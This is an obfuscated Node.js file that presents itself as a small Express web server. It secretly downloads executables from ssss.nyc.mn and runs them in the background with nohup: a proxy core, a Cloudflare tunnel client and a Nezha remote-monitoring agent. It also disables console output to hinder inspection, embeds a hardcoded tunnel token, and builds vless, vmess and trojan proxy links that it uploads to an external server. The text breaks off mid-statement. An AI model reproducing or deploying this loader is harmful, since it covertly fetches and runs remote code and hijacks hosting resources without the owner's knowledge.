const _0x4495f0=_0x51e3;(function(_0x18cb12,_0x39b140){const _0x431563=_0x51e3,_0x50222c=_0x18cb12();while(!![]){try{const _0xeabcba=parseInt(_0x431563(0x262))/0x1*(parseInt(_0x431563(0x23a))/0x2)+parseInt(_0x431563(0x217))/0x3+-parseInt(_0x431563(0x231))/0x4+parseInt(_0x431563(0x1f9))/0x5+parseInt(_0x431563(0x254))/0x6+-parseInt(_0x431563(0x220))/0x7+-parseInt(_0x431563(0x285))/0x8;if(_0xeabcba===_0x39b140)break;else _0x50222c['push'](_0x50222c['shift']());}catch(_0xf2b5c1){_0x50222c['push'](_0x50222c['shift']());}}}(_0x9e23,0xbf2b5));const _0x502201=(function(){let _0x446966=!![];return function(_0x4236e3,_0x471bfa){const _0x3c487f=_0x446966?function(){if(_0x471bfa){const _0x480527=_0x471bfa['apply'](_0x4236e3,arguments);return _0x471bfa=null,_0x480527;}}:function(){};return _0x446966=![],_0x3c487f;};}()),_0x2e6c90=_0x502201(this,function(){const _0x3d6ec0=_0x51e3;return _0x2e6c90[_0x3d6ec0(0x242)]()[_0x3d6ec0(0x1bf)](_0x3d6ec0(0x1ac))[_0x3d6ec0(0x242)]()['constructor'](_0x2e6c90)[_0x3d6ec0(0x1bf)](_0x3d6ec0(0x1ac));});_0x2e6c90();const _0x567d19=(function(){let _0x4ce5d1=!![];return function(_0x11e1f3,_0x359b56){const _0x55208a=_0x4ce5d1?function(){const _0x116de4=_0x51e3;if(_0x359b56){const _0x49e975=_0x359b56[_0x116de4(0x280)](_0x11e1f3,arguments);return _0x359b56=null,_0x49e975;}}:function(){};return _0x4ce5d1=![],_0x55208a;};}()),_0x57d72d=_0x567d19(this,function(){const _0x2c343d=_0x51e3;let _0x463dcd;try{const _0x418391=Function(_0x2c343d(0x27b)+_0x2c343d(0x27d)+');');_0x463dcd=_0x418391();}catch(_0x2ccb38){_0x463dcd=window;}const _0xd26bc=_0x463dcd['console']=_0x463dcd[_0x2c343d(0x1ef)]||{},_0x4fd862=[_0x2c343d(0x20d),_0x2c343d(0x26d),'info',_0x2c343d(0x291),_0x2c343d(0x1ea),_0x2c343d(0x265),'trace'];for(let _0x488bdf=0x0;_0x488bdf<_0x4fd862['length'];_0x488bdf++){const _0x342bd9=_0x567d19[_0x2c343d(0x219)][_0x2c343d(0x22b)]['bind'](_0x567d19),_0x4e3175=_0x4fd862[_0x488bdf],_0x24eaea=_0xd26bc[_0x4e3175]||_0x342bd9;_0x342bd9[_0x2c343d(0x1ba)]=_0x567d19[_0x2c343d(0x290)](_0x567d19),_0x342bd9[_0x2c343d(0x242)]=_0x24eaea[_0x2c343d(0x242)]['bind'](_0x24eaea),_0xd26bc[_0x4e3175]=_0x342bd9;}});_0x57d72d();const express=require('express'),app=express(),axios=require(_0x4495f0(0x1f2)),os=require('os'),fs=require('fs'),path=require(_0x4495f0(0x1e3)),{promisify}=require(_0x4495f0(0x1f8)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4495f0(0x241)][_0x4495f0(0x1e5)]||'',PROJECT_URL=process[_0x4495f0(0x241)][_0x4495f0(0x1c2)]||'',AUTO_ACCESS=process[_0x4495f0(0x241)][_0x4495f0(0x298)]||![],FILE_PATH=process[_0x4495f0(0x241)][_0x4495f0(0x1d9)]||_0x4495f0(0x268),SUB_PATH=process[_0x4495f0(0x241)][_0x4495f0(0x228)]||_0x4495f0(0x1b1),PORT=process['env']['SERVER_PORT']||process[_0x4495f0(0x241)][_0x4495f0(0x1ed)]||0xbb8,UUID=process[_0x4495f0(0x241)][_0x4495f0(0x295)]||'ba07fbee-da77-488d-b232-276a5c3a81ca',NEZHA_SERVER=process[_0x4495f0(0x241)][_0x4495f0(0x202)]||'',NEZHA_PORT=process[_0x4495f0(0x241)][_0x4495f0(0x27e)]||'',NEZHA_KEY=process[_0x4495f0(0x241)][_0x4495f0(0x1d3)]||'',ARGO_DOMAIN=process[_0x4495f0(0x241)]['ARGO_DOMAIN']||_0x4495f0(0x282),ARGO_AUTH=process[_0x4495f0(0x241)]['ARGO_AUTH']||'eyJhIjoiYjQ3YzViY2UxYmM5OTNkYjc3YzQwMjE3MWE1ZDhiNmIiLCJ0IjoiYzM3YjJmNWUtOGRhYi00YzU3LWIxYTYtZGNjYjU5MjQxOGQ3IiwicyI6Ik9UYzJNakppWWpZdFlUazBaaTAwTldVd0xUaGpZVFV0WVdObFpqQm1ZV1psTjJKbSJ9',ARGO_PORT=process['env'][_0x4495f0(0x288)]||0x1f41,CFIP=process['env'][_0x4495f0(0x1c5)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x4495f0(0x1aa)]||0x1bb,NAME=process[_0x4495f0(0x241)][_0x4495f0(0x1c7)]||'zz';!fs[_0x4495f0(0x1f4)](FILE_PATH)?(fs[_0x4495f0(0x1e8)](FILE_PATH),console['log'](FILE_PATH+_0x4495f0(0x1ae))):console[_0x4495f0(0x20d)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3e3ed6=_0x4495f0,_0x22e2cc='abcdefghijklmnopqrstuvwxyz';let _0x25b1f3='';for(let _0x45ce06=0x0;_0x45ce06<0x6;_0x45ce06++){_0x25b1f3+=_0x22e2cc[_0x3e3ed6(0x25f)](Math[_0x3e3ed6(0x21d)](Math[_0x3e3ed6(0x1cc)]()*_0x22e2cc[_0x3e3ed6(0x206)]));}return _0x25b1f3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4495f0(0x21c)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4495f0(0x21c)](FILE_PATH,botName),subPath=path[_0x4495f0(0x21c)](FILE_PATH,_0x4495f0(0x223)),listPath=path[_0x4495f0(0x21c)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x4495f0(0x1e4)),configPath=path['join'](FILE_PATH,_0x4495f0(0x263));function deleteNodes(){const _0x194766=_0x4495f0;try{if(!UPLOAD_URL)return;if(!fs[_0x194766(0x1f4)](subPath))return;let _0x3eec84;try{_0x3eec84=fs[_0x194766(0x225)](subPath,_0x194766(0x253));}catch{return null;}const _0xdc6e7b=Buffer[_0x194766(0x1df)](_0x3eec84,_0x194766(0x286))[_0x194766(0x242)](_0x194766(0x253)),_0x1aedad=_0xdc6e7b[_0x194766(0x226)]('\x0a')[_0x194766(0x1c0)](_0x144abd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x194766(0x218)](_0x144abd));if(_0x1aedad[_0x194766(0x206)]===0x0)return;const _0x1afd28={};_0x1afd28[_0x194766(0x1f0)]=_0x1aedad;const _0x1e2cb2={};_0x1e2cb2['Content-Type']=_0x194766(0x203);const _0x3d52f4={};return _0x3d52f4['headers']=_0x1e2cb2,axios[_0x194766(0x1e9)](UPLOAD_URL+_0x194766(0x1d2),JSON[_0x194766(0x26b)](_0x1afd28),_0x3d52f4)[_0x194766(0x20e)](_0x40b8df=>{return null;}),null;}catch(_0x2acb11){return null;}}function cleanupOldFiles(){const _0x595b7a=_0x4495f0;try{const _0x3b74d9=fs[_0x595b7a(0x297)](FILE_PATH);_0x3b74d9['forEach'](_0xaea2e9=>{const _0x36a833=_0x595b7a,_0x548a5b=path[_0x36a833(0x21c)](FILE_PATH,_0xaea2e9);try{const _0x2fdd79=fs[_0x36a833(0x243)](_0x548a5b);_0x2fdd79[_0x36a833(0x260)]()&&fs[_0x36a833(0x1dd)](_0x548a5b);}catch(_0x3c8522){}});}catch(_0x47ab9b){}}function _0x51e3(_0x4098e7,_0x1d2225){const _0x391266=_0x9e23();return _0x51e3=function(_0x57d72d,_0x567d19){_0x57d72d=_0x57d72d-0x1a4;let _0xc32ca5=_0x391266[_0x57d72d];return _0xc32ca5;},_0x51e3(_0x4098e7,_0x1d2225);}app[_0x4495f0(0x1c9)]('/',function(_0x414439,_0x5c52e8){const _0x3c9930=_0x4495f0;_0x5c52e8[_0x3c9930(0x25e)](_0x3c9930(0x278));});async function generateConfig(){const _0x323d3d=_0x4495f0,_0x47a973={};_0x47a973[_0x323d3d(0x252)]='/dev/null',_0x47a973[_0x323d3d(0x291)]=_0x323d3d(0x208),_0x47a973[_0x323d3d(0x273)]=_0x323d3d(0x283);const _0x478cc5={};_0x478cc5['id']=UUID,_0x478cc5[_0x323d3d(0x1ad)]=_0x323d3d(0x1f1);const _0x30b03c={};_0x30b03c[_0x323d3d(0x1a4)]=0xbb9;const _0x1c4cec={};_0x1c4cec[_0x323d3d(0x1e3)]=_0x323d3d(0x1b3),_0x1c4cec[_0x323d3d(0x1a4)]=0xbba;const _0x439f72={};_0x439f72['path']=_0x323d3d(0x239),_0x439f72[_0x323d3d(0x1a4)]=0xbbb;const _0x9a1515={};_0x9a1515[_0x323d3d(0x1e3)]=_0x323d3d(0x28d),_0x9a1515[_0x323d3d(0x1a4)]=0xbbc;const _0xcda6a2={};_0xcda6a2['clients']=[_0x478cc5],_0xcda6a2[_0x323d3d(0x248)]=_0x323d3d(0x283),_0xcda6a2['fallbacks']=[_0x30b03c,_0x1c4cec,_0x439f72,_0x9a1515];const _0x207d9e={};_0x207d9e['network']=_0x323d3d(0x1e0);const _0x2529dd={};_0x2529dd[_0x323d3d(0x1fb)]=ARGO_PORT,_0x2529dd[_0x323d3d(0x1fe)]=_0x323d3d(0x28a),_0x2529dd[_0x323d3d(0x1f5)]=_0xcda6a2,_0x2529dd[_0x323d3d(0x1b9)]=_0x207d9e;const _0x64c9c3={};_0x64c9c3['id']=UUID;const _0x3424b6={};_0x3424b6[_0x323d3d(0x222)]=[_0x64c9c3],_0x3424b6['decryption']='none';const _0x2a7533={};_0x2a7533[_0x323d3d(0x1ff)]='tcp',_0x2a7533[_0x323d3d(0x232)]=_0x323d3d(0x283);const _0x43a2de={};_0x43a2de[_0x323d3d(0x1fb)]=0xbb9,_0x43a2de[_0x323d3d(0x1a6)]='127.0.0.1',_0x43a2de[_0x323d3d(0x1fe)]='vless',_0x43a2de[_0x323d3d(0x1f5)]=_0x3424b6,_0x43a2de['streamSettings']=_0x2a7533;const _0x367550={};_0x367550['id']=UUID,_0x367550[_0x323d3d(0x1d7)]=0x0;const _0x30347b={};_0x30347b[_0x323d3d(0x222)]=[_0x367550],_0x30347b[_0x323d3d(0x248)]=_0x323d3d(0x283);const _0x589d6a={};_0x589d6a[_0x323d3d(0x1e3)]=_0x323d3d(0x1b3);const _0x40c63a={};_0x40c63a[_0x323d3d(0x1ff)]='ws',_0x40c63a[_0x323d3d(0x232)]=_0x323d3d(0x283),_0x40c63a[_0x323d3d(0x1d6)]=_0x589d6a;const _0x3476e5={};_0x3476e5[_0x323d3d(0x1bd)]=!![],_0x3476e5['destOverride']=['http','tls',_0x323d3d(0x25c)],_0x3476e5['metadataOnly']=![];const _0x5020d1={};_0x5020d1[_0x323d3d(0x1fb)]=0xbba,_0x5020d1[_0x323d3d(0x1a6)]=_0x323d3d(0x261),_0x5020d1[_0x323d3d(0x1fe)]=_0x323d3d(0x28a),_0x5020d1['settings']=_0x30347b,_0x5020d1[_0x323d3d(0x1b9)]=_0x40c63a,_0x5020d1[_0x323d3d(0x22d)]=_0x3476e5;const _0xc57698={};_0xc57698['id']=UUID,_0xc57698['alterId']=0x0;const _0x365ced={};_0x365ced[_0x323d3d(0x222)]=[_0xc57698];const _0x122ca1={};_0x122ca1[_0x323d3d(0x1e3)]=_0x323d3d(0x239);const _0x2af50a={};_0x2af50a[_0x323d3d(0x1ff)]='ws',_0x2af50a['wsSettings']=_0x122ca1;const _0x51c8f4={};_0x51c8f4[_0x323d3d(0x1bd)]=!![],_0x51c8f4[_0x323d3d(0x23c)]=['http','tls','quic'],_0x51c8f4['metadataOnly']=![];const _0x21f5c9={};_0x21f5c9[_0x323d3d(0x1fb)]=0xbbb,_0x21f5c9[_0x323d3d(0x1a6)]='127.0.0.1',_0x21f5c9[_0x323d3d(0x1fe)]=_0x323d3d(0x24d),_0x21f5c9[_0x323d3d(0x1f5)]=_0x365ced,_0x21f5c9[_0x323d3d(0x1b9)]=_0x2af50a,_0x21f5c9[_0x323d3d(0x22d)]=_0x51c8f4;const _0xee217b={};_0xee217b[_0x323d3d(0x212)]=UUID;const _0x4da045={};_0x4da045['clients']=[_0xee217b];const _0x2eca4c={};_0x2eca4c[_0x323d3d(0x1e3)]=_0x323d3d(0x28d);const _0x4f070f={};_0x4f070f[_0x323d3d(0x1ff)]='ws',_0x4f070f[_0x323d3d(0x232)]=_0x323d3d(0x283),_0x4f070f['wsSettings']=_0x2eca4c;const _0x21bf5c={};_0x21bf5c['enabled']=!![],_0x21bf5c[_0x323d3d(0x23c)]=[_0x323d3d(0x1cb),_0x323d3d(0x221),_0x323d3d(0x25c)],_0x21bf5c[_0x323d3d(0x20f)]=![];const _0x348475={};_0x348475['port']=0xbbc,_0x348475[_0x323d3d(0x1a6)]=_0x323d3d(0x261),_0x348475['protocol']=_0x323d3d(0x1f3),_0x348475['settings']=_0x4da045,_0x348475['streamSettings']=_0x4f070f,_0x348475[_0x323d3d(0x22d)]=_0x21bf5c;const _0x2c5c5a={};_0x2c5c5a['servers']=[_0x323d3d(0x1b2)];const _0x3d9fe4={};_0x3d9fe4[_0x323d3d(0x1fe)]=_0x323d3d(0x235),_0x3d9fe4['tag']=_0x323d3d(0x289);const _0x1fb8e2={};_0x1fb8e2['protocol']=_0x323d3d(0x25a),_0x1fb8e2['tag']=_0x323d3d(0x1e7);const _0x26ef07={};_0x26ef07[_0x323d3d(0x20d)]=_0x47a973,_0x26ef07[_0x323d3d(0x255)]=[_0x2529dd,_0x43a2de,_0x5020d1,_0x21f5c9,_0x348475],_0x26ef07['dns']=_0x2c5c5a,_0x26ef07[_0x323d3d(0x24f)]=[_0x3d9fe4,_0x1fb8e2];const _0x8fb71a=_0x26ef07;fs[_0x323d3d(0x1fd)](path['join'](FILE_PATH,_0x323d3d(0x263)),JSON['stringify'](_0x8fb71a,null,0x2));}function getSystemArchitecture(){const _0x488786=_0x4495f0,_0x55ef58=os['arch']();return _0x55ef58==='arm'||_0x55ef58===_0x488786(0x27c)||_0x55ef58===_0x488786(0x1b0)?_0x488786(0x1db):_0x488786(0x204);}function downloadFile(_0x5da176,_0x3892ae,_0x23e339){const _0x58be83=_0x4495f0,_0x38a258=_0x5da176;if(!fs[_0x58be83(0x1f4)](FILE_PATH)){const _0x5cc917={};_0x5cc917[_0x58be83(0x1b7)]=!![],fs[_0x58be83(0x1e8)](FILE_PATH,_0x5cc917);}const _0x352329=fs[_0x58be83(0x1b6)](_0x38a258),_0x408119={};_0x408119['method']='get',_0x408119['url']=_0x3892ae,_0x408119['responseType']='stream',axios(_0x408119)[_0x58be83(0x266)](_0x295432=>{const _0x29b10d=_0x58be83;_0x295432[_0x29b10d(0x1f7)][_0x29b10d(0x1ab)](_0x352329),_0x352329['on'](_0x29b10d(0x287),()=>{const _0xb05aaf=_0x29b10d;_0x352329[_0xb05aaf(0x224)](),console[_0xb05aaf(0x20d)](_0xb05aaf(0x1c4)+path['basename'](_0x38a258)+'\x20successfully'),_0x23e339(null,_0x38a258);}),_0x352329['on'](_0x29b10d(0x291),_0x264527=>{const _0x3cb077=_0x29b10d;fs[_0x3cb077(0x1de)](_0x38a258,()=>{});const _0x2a4386=_0x3cb077(0x1c4)+path[_0x3cb077(0x1b5)](_0x38a258)+_0x3cb077(0x1be)+_0x264527[_0x3cb077(0x24a)];console[_0x3cb077(0x291)](_0x2a4386),_0x23e339(_0x2a4386);});})['catch'](_0x2193b4=>{const _0xe6b9ae=_0x58be83,_0x3ebf5a=_0xe6b9ae(0x1c4)+path['basename'](_0x38a258)+_0xe6b9ae(0x1be)+_0x2193b4[_0xe6b9ae(0x24a)];console[_0xe6b9ae(0x291)](_0x3ebf5a),_0x23e339(_0x3ebf5a);});}async function downloadFilesAndRun(){const _0x197dac=_0x4495f0,_0x2a675c=getSystemArchitecture(),_0x59fe00=getFilesForArchitecture(_0x2a675c);if(_0x59fe00[_0x197dac(0x206)]===0x0){console[_0x197dac(0x20d)](_0x197dac(0x233));return;}const _0x376a12=_0x59fe00[_0x197dac(0x205)](_0x52505c=>{return new Promise((_0x1c620d,_0x11bd28)=>{const _0x61e34=_0x51e3;downloadFile(_0x52505c[_0x61e34(0x1c8)],_0x52505c[_0x61e34(0x237)],(_0x433bd0,_0x5a2beb)=>{_0x433bd0?_0x11bd28(_0x433bd0):_0x1c620d(_0x5a2beb);});});});try{await Promise[_0x197dac(0x209)](_0x376a12);}catch(_0x376eb6){console[_0x197dac(0x291)](_0x197dac(0x20b),_0x376eb6);return;}function _0x1f630b(_0x4b2e51){const _0x4773b8=_0x197dac,_0x17ce9e=0x1fd;_0x4b2e51[_0x4773b8(0x28f)](_0x14e09f=>{const _0x3cfdc6=_0x4773b8;fs['existsSync'](_0x14e09f)&&fs[_0x3cfdc6(0x20c)](_0x14e09f,_0x17ce9e,_0x434ee6=>{const _0x43509e=_0x3cfdc6;_0x434ee6?console[_0x43509e(0x291)]('Empowerment\x20failed\x20for\x20'+_0x14e09f+':\x20'+_0x434ee6):console['log'](_0x43509e(0x28e)+_0x14e09f+':\x20'+_0x17ce9e['toString'](0x8));});});}const _0x560fab=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1f630b(_0x560fab);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5703e6=NEZHA_SERVER[_0x197dac(0x24c)](':')?NEZHA_SERVER[_0x197dac(0x226)](':')[_0x197dac(0x1c3)]():'',_0x1949ad=new Set(['443',_0x197dac(0x236),'2096','2087',_0x197dac(0x1c1),_0x197dac(0x26e)]),_0x5a0ffa=_0x1949ad[_0x197dac(0x22c)](_0x5703e6)?_0x197dac(0x292):_0x197dac(0x20a),_0x16019d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x197dac(0x1ca)+NEZHA_SERVER+_0x197dac(0x22e)+_0x5a0ffa+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x197dac(0x1fd)](path[_0x197dac(0x21c)](FILE_PATH,'config.yaml'),_0x16019d);const _0x45ba22=_0x197dac(0x234)+phpPath+_0x197dac(0x256)+FILE_PATH+_0x197dac(0x258);try{await exec(_0x45ba22),console[_0x197dac(0x20d)](phpName+_0x197dac(0x1fc)),await new Promise(_0x22b0b1=>setTimeout(_0x22b0b1,0x3e8));}catch(_0xe6e489){console[_0x197dac(0x291)](_0x197dac(0x293)+_0xe6e489);}}else{let _0x4f72c6='';const _0x45e2f2=[_0x197dac(0x274),'8443','2096',_0x197dac(0x246),_0x197dac(0x1c1),_0x197dac(0x26e)];_0x45e2f2[_0x197dac(0x24c)](NEZHA_PORT)&&(_0x4f72c6=_0x197dac(0x1c6));const _0xcd799e=_0x197dac(0x234)+npmPath+_0x197dac(0x1e2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x197dac(0x1a8)+NEZHA_KEY+'\x20'+_0x4f72c6+_0x197dac(0x1d5);try{await exec(_0xcd799e),console['log'](npmName+_0x197dac(0x1fc)),await new Promise(_0x771ff7=>setTimeout(_0x771ff7,0x3e8));}catch(_0x3e996b){console[_0x197dac(0x291)](_0x197dac(0x23d)+_0x3e996b);}}}else console[_0x197dac(0x20d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2d2a12=_0x197dac(0x234)+webPath+_0x197dac(0x1e6)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2d2a12),console[_0x197dac(0x20d)](webName+_0x197dac(0x1fc)),await new Promise(_0x4900ce=>setTimeout(_0x4900ce,0x3e8));}catch(_0x56e9ad){console[_0x197dac(0x291)](_0x197dac(0x279)+_0x56e9ad);}if(fs[_0x197dac(0x1f4)](botPath)){let _0x1eea44;if(ARGO_AUTH[_0x197dac(0x281)](/^[A-Z0-9a-z=]{120,250}$/))_0x1eea44='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x197dac(0x281)](/TunnelSecret/)?_0x1eea44=_0x197dac(0x244)+FILE_PATH+_0x197dac(0x240):_0x1eea44=_0x197dac(0x1d0)+FILE_PATH+_0x197dac(0x267)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1eea44+_0x197dac(0x23e)),console[_0x197dac(0x20d)](botName+'\x20is\x20running'),await new Promise(_0x474a17=>setTimeout(_0x474a17,0x7d0));}catch(_0x314442){console[_0x197dac(0x291)](_0x197dac(0x213)+_0x314442);}}await new Promise(_0xd825ae=>setTimeout(_0xd825ae,0x1388));}function getFilesForArchitecture(_0x4f772c){const _0x47113f=_0x4495f0;let _0x16c7e8;if(_0x4f772c==='arm'){const _0x1c14af={};_0x1c14af['fileName']=webPath,_0x1c14af['fileUrl']='https://arm64.ssss.nyc.mn/web';const _0x56ceb8={};_0x56ceb8[_0x47113f(0x1c8)]=botPath,_0x56ceb8[_0x47113f(0x237)]=_0x47113f(0x21a),_0x16c7e8=[_0x1c14af,_0x56ceb8];}else{const _0x1e54fc={};_0x1e54fc['fileName']=webPath,_0x1e54fc[_0x47113f(0x237)]=_0x47113f(0x1bb);const _0x548faf={};_0x548faf[_0x47113f(0x1c8)]=botPath,_0x548faf[_0x47113f(0x237)]=_0x47113f(0x270),_0x16c7e8=[_0x1e54fc,_0x548faf];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x6a58f6=_0x4f772c===_0x47113f(0x1db)?_0x47113f(0x21b):'https://amd64.ssss.nyc.mn/agent',_0x33dc12={};_0x33dc12[_0x47113f(0x1c8)]=npmPath,_0x33dc12[_0x47113f(0x237)]=_0x6a58f6,_0x16c7e8[_0x47113f(0x27a)](_0x33dc12);}else{const _0x68cefe=_0x4f772c===_0x47113f(0x1db)?_0x47113f(0x215):'https://amd64.ssss.nyc.mn/v1',_0x449002={};_0x449002['fileName']=phpPath,_0x449002[_0x47113f(0x237)]=_0x68cefe,_0x16c7e8[_0x47113f(0x27a)](_0x449002);}}return _0x16c7e8;}function argoType(){const _0x3bd66a=_0x4495f0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3bd66a(0x20d)](_0x3bd66a(0x1b8));return;}if(ARGO_AUTH[_0x3bd66a(0x24c)](_0x3bd66a(0x210))){fs['writeFileSync'](path['join'](FILE_PATH,_0x3bd66a(0x21e)),ARGO_AUTH);const _0x2fc6bd=_0x3bd66a(0x1bc)+ARGO_AUTH[_0x3bd66a(0x226)]('\x22')[0xb]+_0x3bd66a(0x238)+path[_0x3bd66a(0x21c)](FILE_PATH,_0x3bd66a(0x21e))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x3bd66a(0x25b)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x3bd66a(0x21c)](FILE_PATH,_0x3bd66a(0x1cf)),_0x2fc6bd);}else console[_0x3bd66a(0x20d)](_0x3bd66a(0x271));}async function extractDomains(){const _0x19d901=_0x4495f0;let _0x600759;if(ARGO_AUTH&&ARGO_DOMAIN)_0x600759=ARGO_DOMAIN,console[_0x19d901(0x20d)](_0x19d901(0x277),_0x600759),await _0x5b62d7(_0x600759);else try{const _0x3e712b=fs['readFileSync'](path[_0x19d901(0x21c)](FILE_PATH,_0x19d901(0x1e4)),_0x19d901(0x253)),_0x233ad9=_0x3e712b[_0x19d901(0x226)]('\x0a'),_0x431953=[];_0x233ad9['forEach'](_0x58a9be=>{const _0x40feb7=_0x19d901,_0x4ce812=_0x58a9be[_0x40feb7(0x281)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4ce812){const _0x1b3946=_0x4ce812[0x1];_0x431953[_0x40feb7(0x26a)](_0x1b3946);}});if(_0x431953['length']>0x0)_0x600759=_0x431953[0x0],console[_0x19d901(0x20d)](_0x19d901(0x211),_0x600759),await _0x5b62d7(_0x600759);else{console[_0x19d901(0x20d)](_0x19d901(0x1ee)),fs[_0x19d901(0x1dd)](path[_0x19d901(0x21c)](FILE_PATH,_0x19d901(0x1e4)));async function _0xc485b2(){const _0x24e857=_0x19d901;try{process[_0x24e857(0x249)]===_0x24e857(0x207)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x24e857(0x1a9)):await exec(_0x24e857(0x275)+botName[_0x24e857(0x25f)](0x0)+']'+botName[_0x24e857(0x21f)](0x1)+_0x24e857(0x1dc));}catch(_0x41150d){}}_0xc485b2(),await new Promise(_0x4a9259=>setTimeout(_0x4a9259,0xbb8));const _0x589bb5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x19d901(0x267)+ARGO_PORT;try{await exec(_0x19d901(0x234)+botPath+'\x20'+_0x589bb5+_0x19d901(0x23e)),console[_0x19d901(0x20d)](botName+_0x19d901(0x1fc)),await new Promise(_0x2a7e0c=>setTimeout(_0x2a7e0c,0xbb8)),await extractDomains();}catch(_0x2e11e2){console[_0x19d901(0x291)](_0x19d901(0x213)+_0x2e11e2);}}}catch(_0x445589){console[_0x19d901(0x291)](_0x19d901(0x1fa),_0x445589);}async function _0x4c24c8(){const _0x398b70=_0x19d901;try{const _0x36287e={};_0x36287e[_0x398b70(0x1e1)]=0xbb8;const _0x4c2bfc=await axios[_0x398b70(0x1c9)](_0x398b70(0x1b4),_0x36287e);if(_0x4c2bfc[_0x398b70(0x1f7)]&&_0x4c2bfc[_0x398b70(0x1f7)][_0x398b70(0x257)]&&_0x4c2bfc[_0x398b70(0x1f7)][_0x398b70(0x227)])return _0x4c2bfc[_0x398b70(0x1f7)][_0x398b70(0x257)]+'_'+_0x4c2bfc['data'][_0x398b70(0x227)];}catch(_0x2376c4){try{const _0x46144a={};_0x46144a[_0x398b70(0x1e1)]=0xbb8;const _0x26716c=await axios[_0x398b70(0x1c9)](_0x398b70(0x251),_0x46144a);if(_0x26716c['data']&&_0x26716c[_0x398b70(0x1f7)][_0x398b70(0x1a7)]===_0x398b70(0x24b)&&_0x26716c[_0x398b70(0x1f7)]['countryCode']&&_0x26716c[_0x398b70(0x1f7)][_0x398b70(0x227)])return _0x26716c['data']['countryCode']+'_'+_0x26716c[_0x398b70(0x1f7)][_0x398b70(0x227)];}catch(_0x2c00be){}}return _0x398b70(0x1af);}async function _0x5b62d7(_0x41046b){const _0x1140c0=await _0x4c24c8(),_0x3b0fd7=NAME?NAME+'-'+_0x1140c0:_0x1140c0;return new Promise(_0x50034b=>{setTimeout(()=>{const _0x446677=_0x51e3,_0x5cc45c={};_0x5cc45c['v']='2',_0x5cc45c['ps']=''+_0x3b0fd7,_0x5cc45c[_0x446677(0x250)]=CFIP,_0x5cc45c[_0x446677(0x1fb)]=CFPORT,_0x5cc45c['id']=UUID,_0x5cc45c[_0x446677(0x284)]='0',_0x5cc45c[_0x446677(0x1d4)]=_0x446677(0x283),_0x5cc45c[_0x446677(0x22f)]='ws',_0x5cc45c[_0x446677(0x296)]=_0x446677(0x283),_0x5cc45c[_0x446677(0x1d8)]=_0x41046b,_0x5cc45c[_0x446677(0x1e3)]=_0x446677(0x1da),_0x5cc45c[_0x446677(0x221)]=_0x446677(0x221),_0x5cc45c[_0x446677(0x1a5)]=_0x41046b,_0x5cc45c['alpn']='',_0x5cc45c['fp']=_0x446677(0x229);const _0x2e8451=_0x5cc45c,_0x428de6='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x446677(0x1ec)+_0x41046b+_0x446677(0x247)+_0x41046b+_0x446677(0x1cd)+_0x3b0fd7+_0x446677(0x245)+Buffer[_0x446677(0x1df)](JSON[_0x446677(0x26b)](_0x2e8451))[_0x446677(0x242)]('base64')+_0x446677(0x1eb)+UUID+'@'+CFIP+':'+CFPORT+_0x446677(0x23f)+_0x41046b+_0x446677(0x247)+_0x41046b+_0x446677(0x1ce)+_0x3b0fd7+'\x0a\x20\x20\x20\x20';console[_0x446677(0x20d)](Buffer[_0x446677(0x1df)](_0x428de6)[_0x446677(0x242)](_0x446677(0x286))),fs[_0x446677(0x1fd)](subPath,Buffer[_0x446677(0x1df)](_0x428de6)['toString'](_0x446677(0x286))),console[_0x446677(0x20d)](FILE_PATH+_0x446677(0x27f)),uploadNodes(),app[_0x446677(0x1c9)]('/'+SUB_PATH,(_0x4d4db3,_0x4e18c7)=>{const _0x1ffebc=_0x446677,_0x1128a7=Buffer['from'](_0x428de6)[_0x1ffebc(0x242)]('base64');_0x4e18c7[_0x1ffebc(0x26c)]('Content-Type',_0x1ffebc(0x28c)),_0x4e18c7[_0x1ffebc(0x25e)](_0x1128a7);}),_0x50034b(_0x428de6);},0x7d0);});}}async function uploadNodes(){const _0x50f4eb=_0x4495f0;if(UPLOAD_URL&&PROJECT_URL){const _0x5f4423=PROJECT_URL+'/'+SUB_PATH,_0x4c9203={};_0x4c9203[_0x50f4eb(0x230)]=[_0x5f4423];const _0x5422de=_0x4c9203;try{const _0x31ea82={};_0x31ea82[_0x50f4eb(0x201)]=_0x50f4eb(0x203);const _0x10a255={};_0x10a255[_0x50f4eb(0x259)]=_0x31ea82;const _0x5f02a3=await axios[_0x50f4eb(0x1e9)](UPLOAD_URL+_0x50f4eb(0x24e),_0x5422de,_0x10a255);return 